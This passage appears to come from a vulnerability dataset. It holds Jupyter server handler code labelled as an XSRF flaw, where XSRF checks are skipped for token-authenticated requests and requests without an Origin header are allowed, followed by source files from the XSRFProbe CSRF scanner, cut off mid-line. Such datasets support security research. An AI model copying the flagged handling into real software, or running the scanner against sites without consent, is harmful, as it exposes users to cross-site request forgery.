@property\n    def cookie_name(self):\n        default_cookie_name = non_alphanum.sub('-', 'username-{}'.format(\n            self.request.host\n        ))\n        return self.settings.get('cookie_name', default_cookie_name)\n    \n    @property\n    def logged_in(self):\n        \"\"\"Is a user currently logged in?\"\"\"\n        user = self.get_current_user()\n        return (user and not user == 'anonymous')\n\n    @property\n    def login_handler(self):\n        \"\"\"Return the login handler for this application, if any.\"\"\"\n        return self.settings.get('login_handler_class', None)\n\n    @property\n    def token(self):\n        \"\"\"Return the login token for this application, if any.\"\"\"\n        return self.settings.get('token', None)\n\n    @property\n    def one_time_token(self):\n        \"\"\"Return the one-time-use token for this application, if any.\"\"\"\n        return self.settings.get('one_time_token', None)\n\n    @property\n    def login_available(self):\n        \"\"\"May a user proceed to log in?\n\n        This returns True if login capability is available, irrespective of\n        whether the user is already logged in or not.\n\n        \"\"\"\n        if self.login_handler is None:\n            return False\n        return bool(self.login_handler.get_login_available(self.settings))\n\n\nclass IPythonHandler(AuthenticatedHandler):\n    \"\"\"IPython-specific extensions to authenticated handling\n    \n    Mostly property shortcuts to IPython-specific settings.\n    \"\"\"\n\n    @property\n    def ignore_minified_js(self):\n        \"\"\"Wether to user bundle in template. (*.min files)\n        \n        Mainly use for development and avoid file recompilation\n        \"\"\"\n        return self.settings.get('ignore_minified_js', False)\n\n    @property\n    def config(self):\n        return self.settings.get('config', None)\n    \n    @property\n    def log(self):\n        \"\"\"use the IPython log by default, falling back on tornado's logger\"\"\"\n        return log()\n\n    @property\n    def jinja_template_vars(self):\n        \"\"\"User-supplied values to supply to jinja templates.\"\"\"\n        return self.settings.get('jinja_template_vars', {})\n    \n    #---------------------------------------------------------------\n    # URLs\n    #---------------------------------------------------------------\n    \n    @property\n    def version_hash(self):\n        \"\"\"The version hash to use for cache hints for static files\"\"\"\n        return self.settings.get('version_hash', '')\n    \n    @property\n    def mathjax_url(self):\n        url = self.settings.get('mathjax_url', '')\n        if not url or url_is_absolute(url):\n            return url\n        return url_path_join(self.base_url, url)\n    \n    @property\n    def mathjax_config(self):\n        return self.settings.get('mathjax_config', 'TeX-AMS-MML_HTMLorMML-full,Safe')\n\n    @property\n    def base_url(self):\n        return self.settings.get('base_url', '/')\n\n    @property\n    def default_url(self):\n        return self.settings.get('default_url', '')\n\n    @property\n    def ws_url(self):\n        return self.settings.get('websocket_url', '')\n\n    @property\n    def contents_js_source(self):\n        self.log.debug(\"Using contents: %s\", self.settings.get('contents_js_source',\n            'services/built/contents'))\n        return self.settings.get('contents_js_source', 'services/built/contents')\n    \n    #---------------------------------------------------------------\n    # Manager objects\n    #---------------------------------------------------------------\n    \n    @property\n    def kernel_manager(self):\n        return self.settings['kernel_manager']\n\n    @property\n    def contents_manager(self):\n        return self.settings['contents_manager']\n    \n    @property\n    def session_manager(self):\n        return self.settings['session_manager']\n    \n    @property\n    def terminal_manager(self):\n        return self.settings['terminal_manager']\n    \n    @property\n    def kernel_spec_manager(self):\n        return self.settings['kernel_spec_manager']\n\n    @property\n    def config_manager(self):\n        return self.settings['config_manager']\n\n    #---------------------------------------------------------------\n    # CORS\n    #---------------------------------------------------------------\n    \n    @property\n    def allow_origin(self):\n        \"\"\"Normal Access-Control-Allow-Origin\"\"\"\n        return self.settings.get('allow_origin', '')\n    \n    @property\n    def allow_origin_pat(self):\n        \"\"\"Regular expression version of allow_origin\"\"\"\n        return self.settings.get('allow_origin_pat', None)\n    \n    @property\n    def allow_credentials(self):\n        \"\"\"Whether to set Access-Control-Allow-Credentials\"\"\"\n        return self.settings.get('allow_credentials', False)\n    \n    def set_default_headers(self):\n        \"\"\"Add CORS headers, if defined\"\"\"\n        super(IPythonHandler, self).set_default_headers()\n        if self.allow_origin:\n            self.set_header(\"Access-Control-Allow-Origin\", self.allow_origin)\n        elif self.allow_origin_pat:\n            origin = self.get_origin()\n            if origin and self.allow_origin_pat.match(origin):\n                self.set_header(\"Access-Control-Allow-Origin\", origin)\n        if self.allow_credentials:\n            self.set_header(\"Access-Control-Allow-Credentials\", 'true')\n    \n    def get_origin(self):\n        # Handle WebSocket Origin naming convention differences\n        # The difference between version 8 and 13 is that in 8 the\n        # client sends a \"Sec-Websocket-Origin\" header and in 13 it's\n        # simply \"Origin\".\n        if \"Origin\" in self.request.headers:\n            origin = self.request.headers.get(\"Origin\")\n        else:\n            origin = self.request.headers.get(\"Sec-Websocket-Origin\", None)\n        return origin\n\n    # origin_to_satisfy_tornado is present because tornado requires\n    # check_origin to take an origin argument, but we don't use it\n    def check_origin(self, origin_to_satisfy_tornado=\"\"):\n        \"\"\"Check Origin for cross-site API requests, including websockets\n\n        Copied from WebSocket with changes:\n\n        - allow unspecified host/origin (e.g. scripts)\n        - allow token-authenticated requests\n        \"\"\"\n        if self.allow_origin == '*' or self.skip_check_origin():\n            return True\n\n        host = self.request.headers.get(\"Host\")\n        origin = self.request.headers.get(\"Origin\")\n\n        # If no header is provided, allow it.\n        # Origin can be None for:\n        # - same-origin (IE, Firefox)\n        # - Cross-site POST form (IE, Firefox)\n        # - Scripts\n        # The cross-site POST (XSRF) case is handled by tornado's xsrf_token\n        if origin is None or host is None:\n            return True\n\n        origin = origin.lower()\n        origin_host = urlparse(origin).netloc\n\n        # OK if origin matches host\n        if origin_host == host:\n            return True\n\n        # Check CORS headers\n        if self.allow_origin:\n            allow = self.allow_origin == origin\n        elif self.allow_origin_pat:\n            allow = bool(self.allow_origin_pat.match(origin))\n        else:\n            # No CORS headers deny the request\n            allow = False\n        if not allow:\n            self.log.warning(\"Blocking Cross Origin API request for %s.  Origin: %s, Host: %s\",\n                self.request.path, origin, host,\n            )\n        return allow\n\n    def check_xsrf_cookie(self):\n        \"\"\"Bypass xsrf checks when token-authenticated\"\"\"\n        if self.token_authenticated:\n            # Token-authenticated requests do not need additional XSRF-check\n            # Servers without authentication are vulnerable to XSRF\n            return\n        return super(IPythonHandler, self).check_xsrf_cookie()\n\n    #---------------------------------------------------------------\n    # template rendering\n    #---------------------------------------------------------------\n    \n    def get_template(self, name):\n        \"\"\"Return the jinja template object for a given name\"\"\"\n        return self.settings['jinja2_env'].get_template(name)\n    \n    def render_template(self, name, **ns):\n        ns.update(self.template_namespace)\n        template = self.get_template(name)\n        return template.render(**ns)\n    \n    @property\n    def template_namespace(self):\n        return dict(\n            base_url=self.base_url,\n            default_url=self.default_url,\n            ws_url=self.ws_url,\n            logged_in=self.logged_in,\n            login_available=self.login_available,\n            token_available=bool(self.token or self.one_time_token),\n            static_url=self.static_url,\n            sys_info=sys_info,\n            contents_js_source=self.contents_js_source,\n            version_hash=self.version_hash,\n            ignore_minified_js=self.ignore_minified_js,\n            xsrf_form_html=self.xsrf_form_html,\n            token=self.token,\n            xsrf_token=self.xsrf_token.decode('utf8'),\n            **self.jinja_template_vars\n        )\n    \n    def get_json_body(self):\n        \"\"\"Return the body of the request as JSON data.\"\"\"\n        if not self.request.body:\n            return None\n        # Do we need to call body.decode('utf-8') here?\n        body = self.request.body.strip().decode(u'utf-8')\n        try:\n            model = json.loads(body)\n        except Exception:\n            self.log.debug(\"Bad JSON: %r\", body)\n            self.log.error(\"Couldn't parse JSON\", exc_info=True)\n            raise web.HTTPError(400, u'Invalid JSON in body of request')\n        return model\n\n    def write_error(self, status_code, **kwargs):\n        \"\"\"render custom error pages\"\"\"\n        exc_info = kwargs.get('exc_info')\n        message = ''\n        status_message = responses.get(status_code, 'Unknown HTTP Error')\n        exception = '(unknown)'\n        if exc_info:\n            exception = exc_info[1]\n            # get the custom message, if defined\n            try:\n                message = exception.log_message % exception.args\n            except Exception:\n                pass\n            \n            # construct the custom reason, if defined\n            reason = getattr(exception, 'reason', '')\n            if reason:\n                status_message = reason\n        \n        # build template namespace\n        ns = dict(\n            status_code=status_code,\n            status_message=status_message,\n            message=message,\n            exception=exception,\n        )\n        \n        self.set_header('Content-Type', 'text/html')\n        # render the template\n        try:\n            html = self.render_template('%s.html' % status_code, **ns)\n        except TemplateNotFound:\n            self.log.debug(\"No template for %d\", status_code)\n            html = self.render_template('error.html', **ns)\n        \n        self.write(html)\n\n\nclass APIHandler(IPythonHandler):\n    \"\"\"Base class for API handlers\"\"\"\n\n    def prepare(self):\n        if not self.check_origin():\n            raise web.HTTPError(404)\n        return super(APIHandler, self).prepare()\n\n    @property\n    def content_security_policy(self):\n        csp = '; '.join([\n                super(APIHandler, self).content_security_policy,\n                \"default-src 'none'\",\n            ])\n        return csp\n    \n    def finish(self, *args, **kwargs):\n        self.set_header('Content-Type', 'application/json')\n        return super(APIHandler, self).finish(*args, **kwargs)\n\n    def options(self, *args, **kwargs):\n        self.set_header('Access-Control-Allow-Headers', 'accept, content-type, authorization')\n        self.set_header('Access-Control-Allow-Methods',\n                        'GET, PUT, POST, PATCH, DELETE, OPTIONS')\n        self.finish()\n\n\nclass Template404(IPythonHandler):\n    \"\"\"Render our 404 template\"\"\"\n    def prepare(self):\n        raise web.HTTPError(404)\n\n\nclass AuthenticatedFileHandler(IPythonHandler, web.StaticFileHandler):\n    \"\"\"static files should only be accessible when logged in\"\"\"\n\n    @web.authenticated\n    def get(self, path):\n        if os.path.splitext(path)[1] == '.ipynb':\n            name = path.rsplit('/', 1)[-1]\n            self.set_header('Content-Type', 'application/json')\n            self.set_header('Content-Disposition','attachment; filename=\"%s\"' % escape.url_escape(name))\n        \n        return web.StaticFileHandler.get(self, path)\n    \n    def set_headers(self):\n        super(AuthenticatedFileHandler, self).set_headers()\n        # disable browser caching, rely on 304 replies for savings\n        if \"v\" not in self.request.arguments:\n            self.add_header(\"Cache-Control\", \"no-cache\")\n    \n    def compute_etag(self):\n        return None\n    \n    def validate_absolute_path(self, root, absolute_path):\n        \"\"\"Validate and return the absolute path.\n        \n        Requires tornado 3.1\n        \n        Adding to tornado's own handling, forbids the serving of hidden files.\n        \"\"\"\n        abs_path = super(AuthenticatedFileHandler, self).validate_absolute_path(root, absolute_path)\n        abs_root = os.path.abspath(root)\n        if is_hidden(abs_path, abs_root):\n            self.log.info(\"Refusing to serve hidden file, via 404 Error\")\n            raise web.HTTPError(404)\n        return abs_path\n\n\ndef json_errors(method):\n    \"\"\"Decorate methods with this to return GitHub style JSON errors.\n    \n    This should be used on any JSON API on any handler method that can raise HTTPErrors.\n    \n    This will grab the latest HTTPError exception using sys.exc_info\n    and then:\n    \n    1. Set the HTTP status code based on the HTTPError\n    2. Create and return a JSON body with a message field describing\n       the error in a human readable form.\n    \"\"\"\n    @functools.wraps(method)\n    @gen.coroutine\n    def wrapper(self, *args, **kwargs):\n        try:\n            result = yield gen.maybe_future(method(self, *args, **kwargs))\n        except web.HTTPError as e:\n            self.set_header('Content-Type', 'application/json')\n            status = e.status_code\n            message = e.log_message\n            self.log.warning(message)\n            self.set_status(e.status_code)\n            reply = dict(message=message, reason=e.reason)\n            self.finish(json.dumps(reply))\n        except Exception:\n            self.set_header('Content-Type', 'application/json')\n            self.log.error(\"Unhandled error in API request\", exc_info=True)\n            status = 500\n            message = \"Unknown server error\"\n            t, value, tb = sys.exc_info()\n            self.set_status(status)\n            tb_text = ''.join(traceback.format_exception(t, value, tb))\n            reply = dict(message=message, reason=None, traceback=tb_text)\n            self.finish(json.dumps(reply))\n        else:\n            # FIXME: can use regular return in generators in py3\n            raise gen.Return(result)\n    return wrapper\n\n\n\n#-----------------------------------------------------------------------------\n# File handler\n#-----------------------------------------------------------------------------\n\n# to minimize subclass changes:\nHTTPError = web.HTTPError\n\nclass FileFindHandler(IPythonHandler, web.StaticFileHandler):\n    \"\"\"subclass of StaticFileHandler for serving files from a search path\"\"\"\n    \n    # cache search results, don't search for files more than once\n    _static_paths = {}\n    \n    def set_headers(self):\n        super(FileFindHandler, self).set_headers()\n        # disable browser caching, rely on 304 replies for savings\n        if \"v\" not in self.request.arguments or \\\n                any(self.request.path.startswith(path) for path in self.no_cache_paths):\n            self.set_header(\"Cache-Control\", \"no-cache\")\n    \n    def initialize(self, path, default_filename=None, no_cache_paths=None):\n        self.no_cache_paths = no_cache_paths or []\n        \n        if isinstance(path, string_types):\n            path = [path]\n        \n        self.root = tuple(\n            os.path.abspath(os.path.expanduser(p)) + os.sep for p in path\n        )\n        self.default_filename = default_filename\n    \n    def compute_etag(self):\n        return None\n    \n    @classmethod\n    def get_absolute_path(cls, roots, path):\n        \"\"\"locate a file to serve on our static file search path\"\"\"\n        with cls._lock:\n            if path in cls._static_paths:\n                return cls._static_paths[path]\n            try:\n                abspath = os.path.abspath(filefind(path, roots))\n            except IOError:\n                # IOError means not found\n                return ''\n            \n            cls._static_paths[path] = abspath\n            \n\n            log().debug(\"Path %s served from %s\"%(path, abspath))\n            return abspath\n    \n    def validate_absolute_path(self, root, absolute_path):\n        \"\"\"check if the file should be served (raises 404, 403, etc.)\"\"\"\n        if absolute_path == '':\n            raise web.HTTPError(404)\n        \n        for root in self.root:\n            if (absolute_path + os.sep).startswith(root):\n                break\n        \n        return super(FileFindHandler, self).validate_absolute_path(root, absolute_path)\n\n\nclass APIVersionHandler(APIHandler):\n\n    @json_errors\n    def get(self):\n        # not authenticated, so give as few info as possible\n        self.finish(json.dumps({\"version\":notebook.__version__}))\n\n\nclass TrailingSlashHandler(web.RequestHandler):\n    \"\"\"Simple redirect handler that strips trailing slashes\n    \n    This should be the first, highest priority handler.\n    \"\"\"\n    \n    def get(self):\n        self.redirect(self.request.uri.rstrip('/'))\n    \n    post = put = get\n\n\nclass FilesRedirectHandler(IPythonHandler):\n    \"\"\"Handler for redirecting relative URLs to the /files/ handler\"\"\"\n    \n    @staticmethod\n    def redirect_to_files(self, path):\n        \"\"\"make redirect logic a reusable static method\n        \n        so it can be called from other handlers.\n        \"\"\"\n        cm = self.contents_manager\n        if cm.dir_exists(path):\n            # it's a *directory*, redirect to /tree\n            url = url_path_join(self.base_url, 'tree', url_escape(path))\n        else:\n            orig_path = path\n            # otherwise, redirect to /files\n            parts = path.split('/')\n\n            if not cm.file_exists(path=path) and 'files' in parts:\n                # redirect without files/ iff it would 404\n                # this preserves pre-2.0-style 'files/' links\n                self.log.warning(\"Deprecated files/ URL: %s\", orig_path)\n                parts.remove('files')\n                path = '/'.join(parts)\n\n            if not cm.file_exists(path=path):\n                raise web.HTTPError(404)\n\n            url = url_path_join(self.base_url, 'files', url_escape(path))\n        self.log.debug(\"Redirecting %s to %s\", self.request.path, url)\n        self.redirect(url)\n    \n    def get(self, path=''):\n        return self.redirect_to_files(self, path)\n\n\nclass RedirectWithParams(web.RequestHandler):\n    \"\"\"Sam as web.RedirectHandler, but preserves URL parameters\"\"\"\n    def initialize(self, url, permanent=True):\n        self._url = url\n        self._permanent = permanent\n\n    def get(self):\n        sep = '&' if '?' in self._url else '?'\n        url = sep.join([self._url, self.request.query])\n        self.redirect(url, permanent=self._permanent)\n\n#-----------------------------------------------------------------------------\n# URL pattern fragments for re-use\n#-----------------------------------------------------------------------------\n\n# path matches any number of `/foo[/bar...]` or just `/` or ''\npath_regex = r\"(?P<path>(?:(?:/[^/]+)+|/?))\"\n\n#-----------------------------------------------------------------------------\n# URL to handler mappings\n#-----------------------------------------------------------------------------\n\n\ndefault_handlers = [\n    (r\".*/\", TrailingSlashHandler),\n    (r\"api\", APIVersionHandler)\n]\n/n/n/n", "label": 1, "vtype": "xsrf"}, {"id": "398ed11584313a371763240392c4dda1cf986deb", "code": "core/logger.py/n/n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n#-:-:-:-:-:-:-::-:-:#\n#    XSRF Probe     #\n#-:-:-:-:-:-:-::-:-:#\n\n# Author: 0xInfection\n# This module requires XSRFProbe\n# https://github.com/0xInfection/XSRFProbe\n\nimport os\nfrom core.colors import *\nfrom files.config import *\nfrom core.verbout import verbout\nfrom files.discovered import INTERNAL_URLS, FILES_EXEC, SCAN_ERRORS\nfrom files.discovered import VULN_LIST, FORMS_TESTED, REQUEST_TOKENS, STRENGTH_LIST\n\ndef logger(filename, content):\n    '''\n    This module is for logging all the stuff we found\n            while crawling and scanning.\n    '''\n    output_file = OUTPUT_DIR + filename + '.log'\n    with open(output_file, 'w+', encoding='utf8') as f:\n        if type(content) is tuple or type(content) is list:\n            for m in content:  # if it is list or tuple, it is iterable\n                f.write(m+'\\n')\n        else:\n            f.write(content)  # else we write out as it is... ;)\n        f.write('\\n')\n\ndef pheaders(tup):\n    '''\n    This module prints out the headers as received in the\n                    requests normally.\n    '''\n    verbout(GR, 'Receiving headers...\\n')\n    verbout(color.GREY,'  '+color.UNDERLINE+'HEADERS'+color.END+color.GREY+':'+'\\n')\n    for key, val in tup.items():\n        verbout('  ',color.CYAN+key+': '+color.ORANGE+val)\n    verbout('','')\n\ndef GetLogger():\n    if INTERNAL_URLS:\n        logger('internal-links', INTERNAL_URLS)\n    if SCAN_ERRORS:\n        logger('errored', SCAN_ERRORS)\n    if FILES_EXEC:\n        logger('files-found', FILES_EXEC)\n    if REQUEST_TOKENS:\n        logger('anti-csrf-tokens', REQUEST_TOKENS)\n    if FORMS_TESTED:\n        logger('forms-tested', FORMS_TESTED)\n    if VULN_LIST:\n        logger('vulnerabilities', VULN_LIST)\n    if STRENGTH_LIST:\n        logger('strengths', STRENGTH_LIST)\n\ndef ErrorLogger(url, error):\n    con = '(i) '+url+' -> '+error.__str__()\n    SCAN_ERRORS.append(con)\n\ndef VulnLogger(url, vuln):\n    tent = '[!] '+url+' -> '+vuln\n    VULN_LIST.append(tent)\n\ndef NovulLogger(url, strength):\n    tent = '[+] '+url+' -> '+strength\n    STRENGTH_LIST.append(tent)\n/n/n/ncore/main.py/n/n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n#-:-:-:-:-:-:-:-:-:#\n#    XSRFProbe     #\n#-:-:-:-:-:-:-:-:-:#\n\n# Author: 0xInfection\n# This module requires XSRFProbe\n# https://github.com/0xInfection/XSRFProbe\n\n# Standard Package imports\nimport os\nimport re\nimport time\nimport warnings\nimport difflib\nimport http.cookiejar\nfrom bs4 import BeautifulSoup\ntry:\n    from urllib.parse import urlencode\n    from urllib.error import HTTPError, URLError\n    from urllib.request import build_opener, HTTPCookieProcessor\nexcept ImportError:  # Throws exception in Case of Python2\n    print(\"\\033[1;91m [-] \\033[1;93mXSRFProbe\\033[0m isn't compatible with Python 2.x versions.\\n\\033[1;91m [-] \\033[0mUse Python 3.x to run \\033[1;93mXSRFProbe.\")\n    quit()\ntry:\n    import requests, stringdist, lxml, bs4\nexcept ImportError:\n    print(' [-] Required dependencies are not installed.\\n [-] Run \\033[1;93mpip3 install -r requirements.txt\\033[0m to fix it.')\n\n# Imports from core\nfrom core.options import *\nfrom core.colors import *\nfrom core.inputin import inputin\nfrom core.request import Get, Post\nfrom core.verbout import verbout\nfrom core.forms import form10, form20\nfrom core.banner import banner, banabout\nfrom core.logger import ErrorLogger, GetLogger\nfrom core.logger import VulnLogger, NovulLogger\n\n# Imports from files\nfrom files.config import *\nfrom files.discovered import FORMS_TESTED\n\n# Imports from modules\nfrom modules import Debugger\nfrom modules import Parser\nfrom modules import Crawler\nfrom modules.Origin import Origin\nfrom modules.Cookie import Cookie\nfrom modules.Tamper import Tamper\nfrom modules.Entropy import Entropy\nfrom modules.Referer import Referer\nfrom modules.Encoding import Encoding\nfrom modules.Analysis import Analysis\nfrom modules.Checkpost import PostBased\n# Import Ends\n\n# First rule, remove the warnings!\nwarnings.filterwarnings('ignore')\n\ndef Engine():  # lets begin it!\n\n    os.system('clear')  # Clear shit from terminal :p\n    banner()  # Print the banner\n    banabout()  # The second banner\n    web, fld = inputin()  # Take the input\n    form1 = form10()  # Get the form 1 ready\n    form2 = form20()  # Get the form 2 ready\n\n    # For the cookies that we encounter during requests...\n    Cookie0 = http.cookiejar.CookieJar()  # First as User1\n    Cookie1 = http.cookiejar.CookieJar()  # Then as User2\n    resp1 = build_opener(HTTPCookieProcessor(Cookie0))  # Process cookies\n    resp2 = build_opener(HTTPCookieProcessor(Cookie1))  # Process cookies\n\n    actionDone = []  # init to the done stuff\n\n    csrf = ''  # no token initialise / invalid token\n    ref_detect = 0x00  # Null Char Flag\n    ori_detect = 0x00  # Null Char Flags\n    form = Debugger.Form_Debugger()  # init to the form parser+token generator\n\n    bs1 = BeautifulSoup(form1).findAll('form',action=True)[0]  # make sure the stuff works properly\n    bs2 = BeautifulSoup(form2).findAll('form',action=True)[0]  # same as above\n\n    init1 = web  # First init\n    resp1.open(init1)  # Makes request as User2\n    resp2.open(init1)  # Make request as User1\n\n    # Now there are 2 different modes of scanning and crawling here.\n    # 1st -> Testing a single endpoint without the --crawl flag.\n    # 2nd -> Testing all endpoints with the --crawl flag.\n    try:\n        # Implementing the first mode. [NO CRAWL]\n        if not CRAWL_SITE:\n            url = web\n            response = Get(url).text\n            try:\n                verbout(O,'Trying to parse response...')\n                soup = BeautifulSoup(response)  # Parser init\n            except HTMLParser.HTMLParseError:\n                verbout(R,'BeautifulSoup Error: '+url)\n            i = 0 # Init user number\n            if REFERER_ORIGIN_CHECKS:\n                # Referer Based Checks if True...\n                verbout(O, 'Checking endpoint request validation via '+color.GREY+'Referer'+color.END+' Checks...')\n                if Referer(url):\n                    ref_detect = 0x01\n                verbout(O, 'Confirming the vulnerability...')\n\n                # We have finished with Referer Based Checks, lets go for Origin Based Ones...\n                verbout(O, 'Confirming endpoint request validation via '+color.GREY+'Origin'+color.END+' Checks...')\n                if Origin(url):\n                    ori_detect = 0x01\n            if COOKIE_BASED:\n                Cookie(url)\n            # Now lets get the forms...\n            verbout(O, 'Retrieving all forms on ' +color.GREY+url+color.END+'...')\n            for m in Debugger.getAllForms(soup):  # iterating over all forms extracted\n                verbout(O,'Testing form:\\n\\n'+color.CYAN+' %s' % (m.prettify()))\n                FORMS_TESTED.append('(i) '+url+':\\n\\n'+m.prettify()+'\\n')\n                try:\n                    if m['action']:\n                        pass\n                except KeyError:\n                    m['action'] = '/' + url.rsplit('/', 1)[1]\n                    ErrorLogger(url, 'No standard form \"action\".')\n                action = Parser.buildAction(url, m['action'])  # get all forms which have 'action' attribute\n                if not action in actionDone and action!='':  # if url returned is not a null value nor duplicate...\n                    # If form submission is kept to True\n                    if FORM_SUBMISSION:\n                        try:\n                            # NOTE: Slow connections may cause read timeouts which may result in AttributeError\n                            result, genpoc = form.prepareFormInputs(m)  # prepare inputs\n                            r1 = Post(url, action, result).text  # make request with token values generated as user1\n                            result, genpoc = form.prepareFormInputs(m)  # prepare the input types\n                            r2 = Post(url, action, result).text  # again make request with token values generated as user2\n                            # Go for token based entropy checks...\n                            try:\n                                if m['name']:\n                                    query, token = Entropy(result, url, m['action'], m['name'])\n                            except KeyError:\n                                query, token = Entropy(result, url, m['action'])\n                            # Now its time to detect the encoding type (if any) of the Anti-CSRF token.\n                            fnd = Encoding(token)\n                            if fnd == 0x01:\n                                VulnLogger(url, 'Token is a string encoded value which can be probably decrypted.')\n                            else:\n                                NovulLogger(url, 'Anti-CSRF token is not a string encoded value.')\n                            # Go for token parameter tamper checks.\n                            if (query and token):\n                                Tamper(url, action, result, r2, query, token)\n                            o2 = resp2.open(url).read()  # make request as user2\n                            try:\n                                form2 = Debugger.getAllForms(BeautifulSoup(o2))[i]  # user2 gets his form\n                            except IndexError:\n                                verbout(R, 'Form Error')\n                                ErrorLogger(url, 'Form Index Error.')\n                                continue  # making sure program won't end here (dirty fix :( )\n                            verbout(GR, 'Preparing form inputs...')\n                            contents2, genpoc = form.prepareFormInputs(form2)  # prepare for form 2 as user2\n                            r3 = Post(url,action,contents2).text  # make request as user3 with user2's form\n                            if POST_BASED and not query and not token:\n                                try:\n                                    if m['name']:\n                                        PostBased(url, r1, r2, r3, m['action'], result, genpoc, m['name'])\n                                except KeyError:\n                                    PostBased(url, r1, r2, r3, m['action'], result, genpoc)\n                            else:\n                                print(color.GREEN+' [+] The form was requested with a Anti-CSRF token.')\n                                print(color.GREEN+' [+] Endpoint '+color.BG+' NOT VULNERABLE '+color.END+color.GREEN+' to POST-Based CSRF Attacks!')\n                                NovulLogger(url, 'Not vulnerable to POST-Based CSRF Attacks.')\n                        except HTTPError as msg:  # if runtime exception...\n                            verbout(R, 'Exception : '+msg.__str__())  # again exception :(\n                            ErrorLogger(url, msg)\n\n                actionDone.append(action)  # add the stuff done\n                i+=1  # Increase user iteration\n\n        else:\n            # Implementing the 2nd mode [CRAWLING AND SCANNING].\n            verbout(GR, \"Initializing crawling and scanning...\")\n            crawler = Crawler.Handler(init1, resp1)  # Init to the Crawler handler\n\n            while crawler.noinit():  # Until 0 urls left\n                url = next(crawler)  # Go for next!\n\n                print(C+'Testing :> '+color.CYAN+url)  # Display what url its crawling\n\n                try:\n                    soup = crawler.process(fld)  # Start the parser\n                    if not soup:\n                        continue  # Making sure not to end the program yet...\n                    i = 0  # Set count = 0 (user number 0, which will be subsequently incremented)\n                    if REFERER_ORIGIN_CHECKS:\n                        # Referer Based Checks if True...\n                        verbout(O, 'Checking endpoint request validation via '+color.GREY+'Referer'+color.END+' Checks...')\n                        if Referer(url):\n                            ref_detect = 0x01\n                        verbout(O, 'Confirming the vulnerability...')\n\n                        # We have finished with Referer Based Checks, lets go for Origin Based Ones...\n                        verbout(O, 'Confirming endpoint request validation via '+color.GREY+'Origin'+color.END+' Checks...')\n                        if Origin(url):\n                            ori_detect = 0x01\n\n                    if COOKIE_BASED:\n                        Cookie(url)\n\n                    # Now lets get the forms...\n                    verbout(O, 'Retrieving all forms on ' +color.GREY+url+color.END+'...')\n                    for m in Debugger.getAllForms(soup):  # iterating over all forms extracted\n                        FORMS_TESTED.append('(i) '+url+':\\n\\n'+m.prettify()+'\\n')\n                        try:\n                            if m['action']:\n                                pass\n                        except KeyError:\n                            m['action'] = '/' + url.rsplit('/', 1)[1]\n                            ErrorLogger(url, 'No standard \"action\" attribute.')\n                        action = Parser.buildAction(url, m['action'])  # get all forms which have 'action' attribute\n                        if not action in actionDone and action != '':  # if url returned is not a null value nor duplicate...\n                            # If form submission is kept to True\n                            if FORM_SUBMISSION:\n                                try:\n                                    result, genpoc = form.prepareFormInputs(m)  # prepare inputs\n                                    r1 = Post(url, action, result).text  # make request with token values generated as user1\n                                    result, genpoc = form.prepareFormInputs(m)  # prepare the input types\n                                    r2 = Post(url, action, result).text  # again make request with token values generated as user2\n                                    # Go for token based entropy checks...\n                                    try:\n                                        if m['name']:\n                                            query, token = Entropy(result, url, m['action'], m['name'])\n                                    except KeyError:\n                                        query, token = Entropy(result, url, m['action'])\n                                        ErrorLogger(url, 'No standard form \"name\".')\n                                    # Now its time to detect the encoding type (if any) of the Anti-CSRF token.\n                                    fnd = Encoding(token)\n                                    if fnd == 0x01:\n                                        VulnLogger(url, 'String encoded token value. Token might be decrypted.')\n                                    else:\n                                        NovulLogger(url, 'Anti-CSRF token is not a string encoded value.')\n                                    # Go for token parameter tamper checks.\n                                    if (query and token):\n                                        Tamper(url, action, result, r2, query, token)\n                                    o2 = resp2.open(url).read()  # make request as user2\n                                    try:\n                                        form2 = Debugger.getAllForms(BeautifulSoup(o2))[i]  # user2 gets his form\n                                    except IndexError:\n                                        verbout(R, 'Form Error')\n                                        ErrorLogger(url, 'Form Index Error.')\n                                        continue  # making sure program won't end here (dirty fix :( )\n                                    verbout(GR, 'Preparing form inputs...')\n                                    contents2, genpoc = form.prepareFormInputs(form2)  # prepare for form 2 as user2\n                                    r3 = Post(url,action,contents2).text  # make request as user3 with user2's form\n                                    if POST_BASED and not query and not token:\n                                        try:\n                                            if m['name']:\n                                                PostBased(url, r1, r2, r3, m['action'], result, genpoc, m['name'])\n                                        except KeyError:\n                                            PostBased(url, r1, r2, r3, m['action'], result, genpoc)\n                                    else:\n                                        print(color.GREEN+' [+] The form was requested with a Anti-CSRF token.')\n                                        print(color.GREEN+' [+] Endpoint '+color.BG+' NOT VULNERABLE '+color.END+color.GREEN+' to P0ST-Based CSRF Attacks!')\n                                        NovulLogger(url, 'Not vulnerable to POST-Based CSRF Attacks.')\n                                except HTTPError as msg:  # if runtime exception...\n                                    verbout(color.RED, ' [-] Exception : '+color.END+msg.__str__())  # again exception :(\n                                    ErrorLogger(url, msg)\n                        actionDone.append(action)  # add the stuff done\n                        i+=1  # Increase user iteration\n                except URLError as e:  # if again...\n                    verbout(R, 'Exception at : '+url)  # again exception -_-\n                    time.sleep(0.4)\n                    verbout(O, 'Moving on...')\n                    ErrorLogger(url, e)\n                    continue  # make sure it doesn't stop at exceptions\n                # This error usually happens when some sites are protected by some load balancer\n                # example Cloudflare. These domains return a 403 forbidden response in various\n                # contexts. For example when making reverse DNS queries.\n                except HTTPError as e:\n                    if str(e.code) == '403':\n                        verbout(R, 'HTTP Authentication Error!')\n                        verbout(R, 'Error Code : ' +O+ str(e.code))\n                        ErrorLogger(url, e)\n                        quit()\n        GetLogger()  # The scanning has finished, so now we can log out all the links ;)\n        print('\\n'+G+\"Scan completed!\"+'\\n')\n        Analysis()  # For Post Scan Analysis\n    except KeyboardInterrupt as e:  # Incase user wants to exit :') (while crawling)\n        verbout(R, 'User Interrupt!')\n        time.sleep(1.5)\n        Analysis()  # For Post scan Analysis\n        print(R+'Aborted!')  # say goodbye\n        ErrorLogger('KeyBoard Interrupt', 'Aborted')\n        quit()\n    except Exception as e:\n        verbout(R, e.__str__())\n        ErrorLogger(url, e)\n/n/n/ncore/options.py/n/n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n#-:-:-:-:-:-:-::-:-:#\n#    XSRF Probe     #\n#-:-:-:-:-:-:-::-:-:#\n\n# Author: 0xInfection\n# This module requires XSRFProbe\n# https://github.com/0xInfection/XSRFProbe\n\n# Importing stuff\nimport argparse, sys, tld\nimport urllib.parse, os\nfrom files import config\nfrom core.colors import R, G\nfrom core.updater import updater\n\n# Processing command line arguments\nparser = argparse.ArgumentParser('python3 